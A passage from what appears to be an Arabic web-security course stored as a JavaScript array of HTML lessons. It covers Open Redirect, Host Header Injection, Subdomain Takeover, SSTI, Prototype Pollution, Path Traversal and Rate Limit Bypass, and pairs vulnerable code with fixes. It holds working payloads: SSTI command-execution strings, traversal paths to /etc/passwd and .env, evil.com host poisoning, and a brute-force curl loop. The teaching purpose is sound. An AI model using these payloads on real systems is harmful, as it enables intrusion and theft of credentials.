        <p>قد يسمح بسرقة Authorization Codes.</p>

        <h3>استغلال OAuth:</h3>

        <pre><code>https://oauth.target.com/auth?
redirect_uri=http://evil.com</code></pre>

        <h3>Open Redirect إلى XSS:</h3>

        <p>بعض التطبيقات تعيد التوجيه عبر JavaScript.</p>

        <pre><code>window.location = user_input;</code></pre>

        <p>قد يؤدي ذلك إلى XSS.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. وجود بارامترات Redirect.</p>
        <p>2. قبول روابط خارجية.</p>
        <p>3. غياب التحقق من الدومين.</p>

        <h3>أدوات اختبار Open Redirect:</h3>

        <pre><code>Burp Suite
OWASP ZAP
ParamSpider
gf Patterns</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$allowed = [
    'target.com'
];

$url = parse_url($_GET['url']);

if(in_array($url['host'], $allowed)) {
    header("Location: " . $_GET['url']);
}</code></pre>

        <h3>استخدام Relative URLs:</h3>

        <pre><code>/dashboard
/profile</code></pre>

        <p>بدلاً من السماح بروابط خارجية.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Allowlist للدومينات.</b></p>

        <p><b>2. منع الروابط الخارجية.</b></p>

        <p><b>3. استخدام Relative Paths فقط.</b></p>

        <p><b>4. التحقق من البروتوكول والدومين.</b></p>

        <p><b>5. منع JavaScript Redirects غير الآمنة.</b></p>

        <h3>مثال على Relative Redirect:</h3>

        <pre><code>Location: /dashboard</code></pre>

        <h3>التحقق من البروتوكول:</h3>

        <pre><code>https://target.com</code></pre>

        <p>بدلاً من السماح بـ:</p>

        <pre><code>javascript:
data:</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح Open Redirect للمهاجم بتنفيذ حملات تصيد احترافي، سرقة بيانات تسجيل الدخول، تجاوز أنظمة الحماية، أو استغلال تدفقات OAuth إذا لم يتم التحقق من روابط التحويل بشكل صحيح.</p>
    `
},



{
    "title": "HTTP Host Header Injection",
    "summary": `
        <p>تعتبر ثغرة <b>HTTP Host Header Injection</b> من الثغرات الخطيرة التي تحدث عندما يثق التطبيق بقيمة Header المسمى <code>Host</code> القادمة من المستخدم بدون التحقق منها.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتنفيذ هجمات تصيد، إعادة تعيين كلمات المرور، Cache Poisoning، أو تجاوز آليات الأمان داخل التطبيق.</p>

        <h3>ما هو Host Header ؟</h3>

        <p>عند إرسال طلب HTTP يقوم المتصفح بإرسال اسم النطاق داخل Header:</p>

        <pre><code>Host: target.com</code></pre>

        <p>يستخدم الخادم هذه القيمة لمعرفة الموقع المطلوب.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا استخدم التطبيق قيمة Host مباشرة داخل الروابط أو العمليات الحساسة بدون تحقق، يستطيع المهاجم إرسال قيمة مزيفة.</p>

        <h3>مثال على طلب طبيعي:</h3>

        <pre><code>GET / HTTP/1.1
Host: target.com</code></pre>

        <h3>يقوم المهاجم بتعديل الطلب:</h3>

        <pre><code>GET / HTTP/1.1
Host: evil.com</code></pre>

        <p>إذا استخدم التطبيق القيمة داخل الرد أو الروابط فالثغرة موجودة.</p>

        <h3>استغلال Password Reset Poisoning:</h3>

        <p>بعض المواقع تنشئ روابط إعادة تعيين كلمة المرور اعتماداً على Host.</p>

        <h3>مثال على كود ضعيف:</h3>

        <pre><code>// Vulnerable Example

$link = "https://" . $_SERVER['HTTP_HOST']
. "/reset?token=abc123";</code></pre>

        <p>يقوم المهاجم بإرسال:</p>

        <pre><code>Host: evil.com</code></pre>

        <p>فتصبح رسالة البريد:</p>

        <pre><code>https://evil.com/reset?token=abc123</code></pre>

        <p>الضحية تضغط الرابط ويتم إرسال Token إلى المهاجم.</p>

        <h3>استغلال Cache Poisoning:</h3>

        <p>قد يتم تخزين صفحات تحتوي على Host مزيف داخل Cache.</p>

        <h3>مثال:</h3>

        <pre><code>Host: attacker.com</code></pre>

        <p>ثم يشاهد المستخدمون الصفحة الملوثة.</p>

        <h3>استغلال Open Redirect:</h3>

        <p>بعض التطبيقات تستخدم Host في عمليات Redirect.</p>

        <pre><code>Location: https://evil.com/login</code></pre>

        <h3>استغلال داخل روابط مطلقة:</h3>

        <pre><code>&lt;a href="https://evil.com/profile"&gt;</code></pre>

        <h3>استغلال داخل Emails:</h3>

        <p>قد يتم استخدام Host داخل:</p>

        <pre><code>Password Reset
Verification Links
Magic Login Links</code></pre>

        <h3>اختبار الثغرة:</h3>

        <pre><code>GET / HTTP/1.1
Host: evil.com</code></pre>

        <p>ثم مراقبة:</p>

        <p>1. الروابط.</p>
        <p>2. رسائل البريد.</p>
        <p>3. عمليات Redirect.</p>
        <p>4. استجابة التطبيق.</p>

        <h3>اختبار X-Forwarded-Host:</h3>

        <p>بعض التطبيقات تستخدم:</p>

        <pre><code>X-Forwarded-Host: evil.com</code></pre>

        <h3>اختبار Forwarded Header:</h3>

        <pre><code>Forwarded: host=evil.com</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Password Reset.</p>
        <p>2. Email Verification.</p>
        <p>3. Reverse Proxies.</p>
        <p>4. APIs.</p>
        <p>5. Cache Systems.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. ظهور Host داخل الاستجابة.</p>
        <p>2. إنشاء روابط اعتماداً على Host.</p>
        <p>3. غياب التحقق من الدومين.</p>

        <h3>اختبار عبر Burp Suite:</h3>

        <p>يقوم المختبر بتعديل:</p>

        <pre><code>Host
X-Forwarded-Host
Forwarded</code></pre>

        <h3>أدوات اختبار HTTP Host Header:</h3>

        <pre><code>Burp Suite
OWASP ZAP
ffuf
curl</code></pre>

        <h3>اختبار باستخدام curl:</h3>

        <pre><code>curl -H "Host: evil.com"
http://target.com</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$allowed_hosts = [
    'target.com'
];

if(!in_array($_SERVER['HTTP_HOST'],
$allowed_hosts)) {
    die("Invalid Host");
}</code></pre>

        <h3>استخدام Canonical Domain:</h3>

        <p>يفضل استخدام دومين ثابت داخل التطبيق.</p>

        <pre><code>https://target.com</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. التحقق من Host Header.</b></p>

        <p><b>2. استخدام Allowlist للدومينات.</b></p>

        <p><b>3. عدم الاعتماد على Host القادم من المستخدم.</b></p>

        <p><b>4. استخدام دومين ثابت داخل الروابط الحساسة.</b></p>

        <p><b>5. تعطيل Host غير المعروفة داخل Web Server.</b></p>

        <h3>مثال على Apache:</h3>

        <pre><code>ServerName target.com</code></pre>

        <h3>مثال على Nginx:</h3>

        <pre><code>server_name target.com;</code></pre>

        <h3>التحقق من Reverse Proxy:</h3>

        <p>يجب التحقق من Headers مثل:</p>

        <pre><code>X-Forwarded-Host</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح HTTP Host Header Injection بتنفيذ حملات تصيد، سرقة Password Reset Tokens، تلويث Cache، تجاوز الحماية، أو التحكم في الروابط الحساسة إذا لم يتم التحقق من قيمة Host بشكل صحيح.</p>
    `
},



{
    "title": "Subdomain Takeover",
    "summary": `
        <p>تعتبر ثغرة <b>Subdomain Takeover</b> من الثغرات الخطيرة المرتبطة بإدارة DNS والخدمات السحابية، وتحدث عندما يشير Subdomain إلى خدمة خارجية غير مستخدمة أو محذوفة، مما يسمح للمهاجم بالسيطرة عليه.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لإنشاء صفحات تصيد، استضافة ملفات خبيثة، تجاوز سياسات الأمان، أو سرقة بيانات المستخدمين تحت دومين رسمي موثوق.</p>

        <h3>ما هو Subdomain ؟</h3>

        <p>هو نطاق فرعي مرتبط بالدومين الرئيسي.</p>

        <h3>مثال:</h3>

        <pre><code>blog.target.com
api.target.com
cdn.target.com</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يحتوي DNS على سجل يشير إلى خدمة خارجية لم تعد موجودة.</p>

        <h3>مثال على CNAME:</h3>

        <pre><code>blog.target.com → old-blog.herokuapp.com</code></pre>

        <p>إذا تم حذف خدمة Heroku الأصلية يستطيع المهاجم تسجيل نفس الاسم والسيطرة على Subdomain.</p>

        <h3>أنواع DNS Records المستخدمة:</h3>

        <pre><code>CNAME
A Record
NS Record</code></pre>

        <h3>أشهر الخدمات المعرضة:</h3>

        <p>1. Heroku.</p>
        <p>2. GitHub Pages.</p>
        <p>3. AWS S3.</p>
        <p>4. Azure.</p>
        <p>5. Shopify.</p>
        <p>6. Fastly.</p>

        <h3>مثال على GitHub Pages:</h3>

        <pre><code>docs.target.com → username.github.io</code></pre>

        <p>إذا تم حذف المستودع GitHub يستطيع المهاجم إعادة إنشاء المشروع.</p>

        <h3>مثال على AWS S3:</h3>

        <pre><code>static.target.com → bucket.s3.amazonaws.com</code></pre>

        <p>إذا كان Bucket محذوفاً يستطيع المهاجم إنشاء Bucket بنفس الاسم.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. رسائل:</p>

        <pre><code>No such app
NoSuchBucket
Repository not found</code></pre>

        <p>2. ظهور صفحات افتراضية من الخدمات السحابية.</p>

        <p>3. وجود CNAME يشير لخدمة غير موجودة.</p>

        <h3>اختبار الثغرة باستخدام dig:</h3>

        <pre><code>dig sub.target.com</code></pre>

        <h3>اختبار CNAME:</h3>

        <pre><code>dig CNAME sub.target.com</code></pre>

        <h3>اختبار باستخدام nslookup:</h3>

        <pre><code>nslookup sub.target.com</code></pre>

        <h3>اختبار HTTP Response:</h3>

        <pre><code>curl http://sub.target.com</code></pre>

        <h3>مثال على رسالة Heroku:</h3>

        <pre><code>No such app</code></pre>

        <p>قد تدل على إمكانية الاستحواذ.</p>

        <h3>مثال عملي:</h3>

        <p>1. الشركة تحذف تطبيق Heroku.</p>

        <p>2. يبقى CNAME داخل DNS.</p>

        <p>3. المهاجم يسجل نفس التطبيق.</p>

        <p>4. يصبح subdomain تحت سيطرة المهاجم.</p>

        <h3>استغلال الثغرة:</h3>

        <p>بعد السيطرة على Subdomain يمكن:</p>

        <p>1. إنشاء صفحات تصيد.</p>
        <p>2. سرقة Cookies.</p>
        <p>3. تجاوز CSP.</p>
        <p>4. استضافة JavaScript خبيث.</p>
        <p>5. استغلال SameSite Cookies.</p>

        <h3>استغلال مع OAuth:</h3>

        <p>إذا كان Subdomain ضمن Redirect URIs قد يؤدي لاختطاف الحسابات.</p>

        <h3>أماكن شائعة:</h3>

        <p>1. النطاقات القديمة.</p>
        <p>2. البيئات التجريبية.</p>
        <p>3. مواقع التوثيق.</p>
        <p>4. CDN Subdomains.</p>

        <h3>أدوات اكتشاف Subdomain Takeover:</h3>

        <pre><code>subjack
subzy
amass
assetfinder
httpx</code></pre>

        <h3>اختبار باستخدام subjack:</h3>

        <pre><code>subjack -w subs.txt -t 50</code></pre>

        <h3>اختبار باستخدام subzy:</h3>

        <pre><code>subzy run --targets subs.txt</code></pre>

        <h3>خطورة NS Takeover:</h3>

        <p>إذا كان NS Record يشير إلى Nameserver محذوف قد يؤدي للسيطرة الكاملة على DNS.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. حذف DNS Records غير المستخدمة.</b></p>

        <p><b>2. مراقبة الخدمات السحابية المرتبطة بالدومينات.</b></p>

        <p><b>3. فحص CNAMEs بشكل دوري.</b></p>

        <p><b>4. إزالة الخدمات القديمة من DNS.</b></p>

        <p><b>5. استخدام أدوات مراقبة تلقائية.</b></p>

        <h3>فحص دوري للدومينات:</h3>

        <pre><code>amass enum -d target.com</code></pre>

        <h3>التأكد من الخدمات:</h3>

        <p>يجب التأكد أن كل CNAME يشير لخدمة موجودة فعلاً.</p>

        <h3>استخدام Asset Management:</h3>

        <p>لتتبع جميع النطاقات والخدمات المرتبطة بها.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح Subdomain Takeover للمهاجم بالسيطرة على نطاقات فرعية رسمية، تنفيذ حملات تصيد، تجاوز سياسات الأمان، استضافة ملفات خبيثة، أو استغلال ثقة المستخدمين بالدومين الرسمي.</p>
    `
},



{
    "title": "SSTI (Server Side Template Injection)",
    "summary": `
        <p>تعتبر ثغرة <b>Server Side Template Injection (SSTI)</b> من أخطر ثغرات تطبيقات الويب، وتحدث عندما يقوم التطبيق بتمرير مدخلات المستخدم مباشرة إلى محرك القوالب (Template Engine) بدون فلترة أو عزل.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتنفيذ أوامر على الخادم، قراءة ملفات النظام، استخراج بيانات حساسة، أو الوصول إلى Remote Code Execution (RCE).</p>

        <h3>ما هو Template Engine ؟</h3>

        <p>هو نظام يستخدم لإنشاء صفحات HTML ديناميكية.</p>

        <h3>أمثلة على محركات القوالب:</h3>

        <p>1. Jinja2 (Python).</p>
        <p>2. Twig (PHP).</p>
        <p>3. Freemarker (Java).</p>
        <p>4. Velocity.</p>
        <p>5. Smarty.</p>
        <p>6. Handlebars.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا قام التطبيق بدمج مدخلات المستخدم داخل Template مباشرة يمكن للمهاجم تنفيذ أوامر Template.</p>

        <h3>مثال على كود Python ضعيف:</h3>

        <pre><code>// Vulnerable Example

from flask import render_template_string

name = request.args.get("name")

return render_template_string("Hello " + name)</code></pre>

        <h3>اختبار بسيط:</h3>

        <pre><code>{{7*7}}</code></pre>

        <p>إذا ظهر:</p>

        <pre><code>49</code></pre>

        <p>فهذا يدل على وجود SSTI.</p>

        <h3>اختبارات شائعة:</h3>

        <pre><code>{{7*7}}
\${7*7}
&lt;%= 7*7 %&gt;
#{7*7}</code></pre>

        <h3>اختبار Jinja2:</h3>

        <pre><code>{{config.items()}}</code></pre>

        <p>قد يعرض إعدادات التطبيق.</p>

        <h3>قراءة ملفات النظام:</h3>

        <pre><code>{{''.__class__.__mro__[1].__subclasses__()}}</code></pre>

        <p>يستخدم للوصول إلى Classes داخل Python.</p>

        <h3>تنفيذ أوامر نظام:</h3>

        <pre><code>{{cycler.__init__.__globals__.os.popen('id').read()}}</code></pre>

        <p>قد يؤدي إلى Remote Code Execution.</p>

        <h3>مثال على قراءة /etc/passwd:</h3>

        <pre><code>{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}</code></pre>

        <h3>استغلال داخل Twig:</h3>

        <pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}</code></pre>

        <h3>استغلال Freemarker:</h3>

        <pre><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;
\${ ex("id") }</code></pre>

        <h3>أماكن شائعة لوجود SSTI:</h3>

        <p>1. صفحات الترحيب.</p>
        <p>2. أنظمة البريد.</p>
        <p>3. PDF Generators.</p>
        <p>4. أنظمة البحث.</p>
        <p>5. صفحات الخطأ.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. تنفيذ العمليات الحسابية.</p>
        <p>2. ظهور Syntax Errors خاصة بالقوالب.</p>
        <p>3. اختلاف الاستجابة بعد إدخال {{ }}.</p>

        <h3>اختبار باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بإرسال:</p>

        <pre><code>{{7*7}}</code></pre>

        <p>داخل جميع الحقول.</p>

        <h3>اختبار Template Detection:</h3>

        <pre><code>{{7*7}}
\${7*7}
&lt;%=7*7%&gt;
#{7*7}</code></pre>

        <h3>أدوات اكتشاف SSTI:</h3>

        <pre><code>Burp Suite
Tplmap
OWASP ZAP</code></pre>

        <h3>اختبار باستخدام tplmap:</h3>

        <pre><code>python2 tplmap.py
-u "http://target.com/?name=*" </code></pre>

        <h3>استغلال SSTI إلى RCE:</h3>

        <p>إذا كان محرك القوالب يسمح بالوصول إلى النظام قد يؤدي إلى تنفيذ أوامر مباشرة.</p>

        <h3>مثال على تنفيذ whoami:</h3>

        <pre><code>{{cycler.__init__.__globals__.os.popen('whoami').read()}}</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

return render_template("index.html",
name=user_input)</code></pre>

        <p>بدلاً من دمج المستخدم داخل Template مباشرة.</p>

        <h3>استخدام Escaping:</h3>

        <p>يجب تحويل المدخلات إلى نص عادي.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. عدم تمرير مدخلات المستخدم مباشرة داخل Template.</b></p>

        <p><b>2. استخدام Escaping للمدخلات.</b></p>

        <p><b>3. تعطيل الوظائف الخطيرة داخل Template Engine.</b></p>

        <p><b>4. استخدام Sandboxing.</b></p>

        <p><b>5. تحديث محركات القوالب باستمرار.</b></p>

        <p><b>6. استخدام Strict Variable Handling.</b></p>

        <h3>مثال على Sandboxed Environment:</h3>

        <pre><code>SandboxedEnvironment()</code></pre>

        <h3>تعطيل الوصول للنظام:</h3>

        <p>يجب منع الوصول إلى:</p>

        <pre><code>os
exec
system
Runtime</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر SSTI من أخطر ثغرات الويب لأنها قد تؤدي إلى Remote Code Execution، قراءة ملفات النظام، استخراج الأسرار، والسيطرة الكاملة على الخادم والتطبيق.</p>
    `
},



{
    "title": "Prototype Pollution in JavaScript",
    "summary": `
        <p>تعتبر ثغرة <b>Prototype Pollution</b> من أخطر ثغرات JavaScript الحديثة، وتحدث عندما يستطيع المهاجم تعديل الخصائص المشتركة داخل Prototype Objects مما يؤثر على جميع الكائنات داخل التطبيق.</p>

        <p>يمكن استغلال هذه الثغرة لتجاوز المصادقة، تنفيذ XSS، التحكم في منطق التطبيق، أو الوصول إلى Remote Code Execution في بعض البيئات.</p>

        <h3>ما هو Prototype ؟</h3>

        <p>في JavaScript كل Object يرث خصائص ووظائف من كائن أساسي يسمى Prototype.</p>

        <h3>مثال:</h3>

        <pre><code>const user = {};

console.log(user.toString);</code></pre>

        <p>الدالة <code>toString()</code> موجودة داخل Object Prototype.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا قام التطبيق بدمج بيانات المستخدم داخل Objects بدون فلترة قد يستطيع المهاجم تعديل Prototype.</p>

        <h3>مثال على كود ضعيف:</h3>

        <pre><code>// Vulnerable Example

function merge(target, source) {
    for(let key in source) {
        target[key] = source[key];
    }
}

let obj = {};
merge(obj, JSON.parse(user_input));</code></pre>

        <h3>يقوم المهاجم بإرسال:</h3>

        <pre><code>{
 "__proto__": {
   "isAdmin": true
 }
}</code></pre>

        <p>النتيجة:</p>

        <pre><code>({}).isAdmin === true</code></pre>

        <p>أي أن جميع Objects أصبحت تحتوي على الخاصية isAdmin.</p>

        <h3>تجاوز المصادقة:</h3>

        <pre><code>if(user.isAdmin) {
    // Access Granted
}</code></pre>

        <p>قد يحصل المهاجم على صلاحيات مدير.</p>

        <h3>استغلال عبر Query Parameters:</h3>

        <pre><code>?__proto__[isAdmin]=true</code></pre>

        <h3>استغلال عبر JSON:</h3>

        <pre><code>{
 "__proto__": {
   "admin": true
 }
}</code></pre>

        <h3>خصائص خطيرة:</h3>

        <pre><code>__proto__
constructor
prototype</code></pre>

        <h3>استغلال إلى XSS:</h3>

        <p>بعض التطبيقات تستخدم خصائص داخل DOM.</p>

        <pre><code>{
 "__proto__": {
   "innerHTML":"&lt;script&gt;alert(1)&lt;/script&gt;"
 }
}</code></pre>

        <h3>استغلال داخل Node.js:</h3>

        <p>قد يؤدي إلى التحكم بإعدادات النظام أو تنفيذ أوامر.</p>

        <h3>مثال:</h3>

        <pre><code>{
 "__proto__": {
   "shell":"/bin/sh"
 }
}</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Deep Merge Libraries.</p>
        <p>2. Object Parsers.</p>
        <p>3. JSON APIs.</p>
        <p>4. Express Applications.</p>
        <p>5. Frontend Frameworks.</p>

        <h3>مكتبات معروفة تعرضت للثغرة:</h3>

        <pre><code>lodash
jQuery
hoek
merge-deep</code></pre>

        <h3>اختبار بسيط:</h3>

        <pre><code>?__proto__[test]=123</code></pre>

        <p>ثم داخل Console:</p>

        <pre><code>({}).test</code></pre>

        <p>إذا ظهرت القيمة فالثغرة موجودة.</p>

        <h3>اختبار باستخدام JSON:</h3>

        <pre><code>{
 "__proto__": {
   "polluted":"yes"
 }
}</code></pre>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. استخدام Deep Merge.</p>
        <p>2. قبول Objects من المستخدم.</p>
        <p>3. تعديل خصائص Objects بشكل ديناميكي.</p>

        <h3>اختبار باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بحقن:</p>

        <pre><code>__proto__
constructor.prototype</code></pre>

        <h3>أدوات اكتشاف Prototype Pollution:</h3>

        <pre><code>Burp Suite
PPScan
NodeJsScan
OWASP ZAP</code></pre>

        <h3>مثال على Deep Merge خطير:</h3>

        <pre><code>lodash.merge({}, user_input)</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

if(key === "__proto__"
|| key === "constructor"
|| key === "prototype") {
    return;
}</code></pre>

        <h3>استخدام Object.create(null):</h3>

        <pre><code>const obj = Object.create(null);</code></pre>

        <p>ينشئ Object بدون Prototype.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. منع __proto__ و constructor و prototype.</b></p>

        <p><b>2. تحديث المكتبات باستمرار.</b></p>

        <p><b>3. استخدام Safe Merge Functions.</b></p>

        <p><b>4. التحقق من مفاتيح Objects.</b></p>

        <p><b>5. استخدام Object.freeze() عند الحاجة.</b></p>

        <p><b>6. استخدام Object.create(null).</b></p>

        <h3>مثال على تجميد Prototype:</h3>

        <pre><code>Object.freeze(Object.prototype)</code></pre>

        <h3>التأكد من Validation:</h3>

        <p>يجب التحقق من جميع المفاتيح القادمة من المستخدم.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Prototype Pollution من الثغرات الخطيرة لأنها قد تؤدي إلى تجاوز المصادقة، تنفيذ XSS، التحكم بمنطق التطبيق، أو الوصول إلى Remote Code Execution داخل تطبيقات Node.js وJavaScript.</p>
    `
},




{
    "title": "Path Traversal in APIs",
    "summary": `
        <p>تعتبر ثغرة <b>Path Traversal</b> أو <b>Directory Traversal</b> داخل APIs من الثغرات الخطيرة التي تحدث عندما يسمح التطبيق للمستخدم بالتحكم في مسار الملفات بدون فلترة صحيحة.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة للوصول إلى ملفات حساسة خارج المجلد المسموح به، قراءة بيانات النظام، استخراج مفاتيح سرية، أو أحياناً تنفيذ أوامر على الخادم.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تقوم بعض APIs بتحميل أو قراءة الملفات اعتماداً على اسم ملف يرسله المستخدم.</p>

        <h3>مثال:</h3>

        <pre><code>GET /api/download?file=report.pdf</code></pre>

        <p>إذا لم يتحقق التطبيق من المسار يستطيع المهاجم استخدام:</p>

        <pre><code>../../../</code></pre>

        <p>للخروج من المجلد الحالي.</p>

        <h3>مثال عملي:</h3>

        <pre><code>GET /api/download?file=../../../etc/passwd</code></pre>

        <p>قد يؤدي إلى قراءة ملف:</p>

        <pre><code>/etc/passwd</code></pre>

        <h3>مثال على كود Node.js ضعيف:</h3>

        <pre><code>// Vulnerable Example

app.get('/download', (req, res) => {
    const file = req.query.file;

    res.sendFile('/var/www/files/' + file);
});</code></pre>

        <h3>استغلال Windows:</h3>

        <pre><code>..\..\..\Windows\win.ini</code></pre>

        <h3>استغلال API JSON:</h3>

        <pre><code>POST /api/file

{
 "path":"../../../etc/passwd"
}</code></pre>

        <h3>استغلال عبر REST APIs:</h3>

        <pre><code>GET /api/files/../../../etc/passwd</code></pre>

        <h3>ملفات حساسة شائعة:</h3>

        <pre><code>/etc/passwd
/etc/shadow
.env
config.php
id_rsa
web.config</code></pre>

        <h3>Path Traversal داخل Docker:</h3>

        <pre><code>/proc/self/environ</code></pre>

        <p>قد يحتوي على Environment Variables حساسة.</p>

        <h3>استغلال .env:</h3>

        <pre><code>GET /api/download?file=../../../.env</code></pre>

        <p>قد يؤدي لاستخراج:</p>

        <pre><code>DB_PASSWORD
API_KEYS
JWT_SECRET</code></pre>

        <h3>تجاوز الفلاتر:</h3>

        <h3>1. URL Encoding:</h3>

        <pre><code>..%2f..%2f..%2fetc/passwd</code></pre>

        <h3>2. Double Encoding:</h3>

        <pre><code>%252e%252e%252f</code></pre>

        <h3>3. استخدام Backslashes:</h3>

        <pre><code>..\..\..\</code></pre>

        <h3>4. Null Byte Injection:</h3>

        <pre><code>../../../etc/passwd%00.png</code></pre>

        <h3>5. Absolute Paths:</h3>

        <pre><code>/etc/passwd</code></pre>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. API تتعامل مع ملفات.</p>
        <p>2. وجود بارامترات مثل:</p>

        <pre><code>file
path
document
download</code></pre>

        <p>3. ظهور أخطاء File Not Found.</p>

        <h3>اختبار باستخدام Burp Suite:</h3>

        <pre><code>../../../etc/passwd</code></pre>

        <p>داخل جميع بارامترات الملفات.</p>

        <h3>اختبار عبر curl:</h3>

        <pre><code>curl
"http://target.com/api/download?file=../../../etc/passwd"</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. APIs تحميل الملفات.</p>
        <p>2. أنظمة النسخ الاحتياطي.</p>
        <p>3. Download Managers.</p>
        <p>4. File Preview.</p>
        <p>5. Image APIs.</p>

        <h3>أدوات اختبار Path Traversal:</h3>

        <pre><code>Burp Suite
OWASP ZAP
ffuf
dotdotpwn</code></pre>

        <h3>اختبار باستخدام dotdotpwn:</h3>

        <pre><code>dotdotpwn -m http-url
-u "http://target.com/api?file=TRAVERSAL"</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

const path = require('path');

const base = '/var/www/files';

const safePath = path.normalize(
path.join(base, user_input)
);

if(!safePath.startsWith(base)) {
    return res.status(403).send('Forbidden');
}</code></pre>

        <h3>استخدام Allowlist:</h3>

        <p>السماح فقط بأسماء ملفات محددة.</p>

        <h3>مثال:</h3>

        <pre><code>report.pdf
invoice.pdf</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام path normalization.</b></p>

        <p><b>2. منع ../ و ..\\.</b></p>

        <p><b>3. استخدام Allowlist للملفات.</b></p>

        <p><b>4. عدم استخدام مدخلات المستخدم مباشرة.</b></p>

        <p><b>5. عزل الملفات الحساسة خارج Web Root.</b></p>

        <p><b>6. تعطيل الوصول إلى ملفات النظام.</b></p>

        <h3>التحقق من الامتداد:</h3>

        <pre><code>.pdf
.jpg
.png</code></pre>

        <h3>استخدام Sandboxing:</h3>

        <p>لحصر الوصول داخل مجلد محدد فقط.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح Path Traversal داخل APIs للمهاجم بقراءة ملفات حساسة، استخراج كلمات المرور والمفاتيح السرية، الوصول إلى إعدادات النظام، أو أحياناً تنفيذ هجمات متقدمة تؤدي إلى السيطرة الكاملة على الخادم.</p>
    `
},



{
    "title": "API Rate Limit Bypass",
    "summary": `
        <p>تعتبر ثغرة <b>API Rate Limit Bypass</b> من الثغرات الشائعة في تطبيقات الويب وواجهات APIs، وتحدث عندما يفشل النظام في تطبيق قيود صحيحة على عدد الطلبات المرسلة من المستخدم.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتنفيذ Brute Force، تجاوز القيود الأمنية، استنزاف موارد الخادم، أو إرسال آلاف الطلبات بدون حظر.</p>

        <h3>ما هو Rate Limiting ؟</h3>

        <p>هو نظام يحدد عدد الطلبات المسموح بها خلال فترة زمنية.</p>

        <h3>مثال:</h3>

        <pre><code>100 Requests / Minute</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>بعض الأنظمة تعتمد على IP فقط أو Headers قابلة للتعديل مما يسمح بتجاوز الحماية.</p>

        <h3>مثال على API تسجيل دخول:</h3>

        <pre><code>POST /api/login</code></pre>

        <p>إذا لم يكن هناك Rate Limiting قوي يستطيع المهاجم تنفيذ:</p>

        <pre><code>Brute Force Attack</code></pre>

        <h3>اختبار Rate Limiting:</h3>

        <p>يقوم المختبر بإرسال عدد كبير من الطلبات بسرعة.</p>

        <pre><code>for i in {1..1000}
do
curl http://target.com/api/login
done</code></pre>

        <h3>إذا لم يظهر:</h3>

        <pre><code>429 Too Many Requests</code></pre>

        <p>فالحماية ضعيفة أو غير موجودة.</p>

        <h3>طرق تجاوز Rate Limit:</h3>

        <h3>1. تغيير IP Address:</h3>

        <p>باستخدام Proxies أو VPNs.</p>

        <h3>2. استخدام X-Forwarded-For:</h3>

        <pre><code>X-Forwarded-For: 1.1.1.1</code></pre>

        <p>بعض الأنظمة تعتمد على هذا Header بشكل خاطئ.</p>

        <h3>3. تغيير Headers:</h3>

        <pre><code>X-Real-IP
Client-IP
Forwarded</code></pre>

        <h3>4. استخدام IPv6 Rotation:</h3>

        <p>لتغيير العناوين باستمرار.</p>

        <h3>5. Race Condition:</h3>

        <p>إرسال عدة طلبات متزامنة قبل تحديث العداد.</p>

        <h3>6. استخدام عدة Accounts:</h3>

        <p>لتوزيع الطلبات.</p>

        <h3>7. تغيير User-Agent:</h3>

        <pre><code>User-Agent: Mozilla/5.0</code></pre>

        <h3>8. استخدام Endpoints مختلفة:</h3>

        <pre><code>/api/v1/login
/api/v2/login</code></pre>

        <h3>استغلال OTP Brute Force:</h3>

        <pre><code>POST /api/verify-otp</code></pre>

        <p>إذا لم يوجد Rate Limit يمكن تخمين OTP.</p>

        <h3>استغلال Password Reset:</h3>

        <p>إرسال آلاف طلبات Reset.</p>

        <h3>استغلال GraphQL APIs:</h3>

        <p>بعض GraphQL APIs لا تطبق Rate Limits صحيحة.</p>

        <h3>علامات تدل على ضعف Rate Limiting:</h3>

        <p>1. عدم ظهور 429.</p>
        <p>2. غياب Retry-After Header.</p>
        <p>3. قبول آلاف الطلبات بسرعة.</p>

